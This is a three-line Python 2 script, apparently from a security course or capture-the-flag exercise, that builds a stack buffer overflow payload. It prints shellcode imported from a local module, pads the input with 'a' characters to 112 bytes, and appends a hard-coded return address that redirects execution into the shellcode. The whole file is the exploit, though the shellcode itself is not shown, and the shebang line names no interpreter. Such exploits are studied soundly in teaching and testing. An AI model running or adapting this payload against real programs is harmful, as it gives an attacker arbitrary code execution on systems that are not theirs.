#!/usr/bin/env
from shellcode import shellcode
print shellcode+"a"*(108+4-len(shellcode))+"\xfc\x86\xfe\xbf"
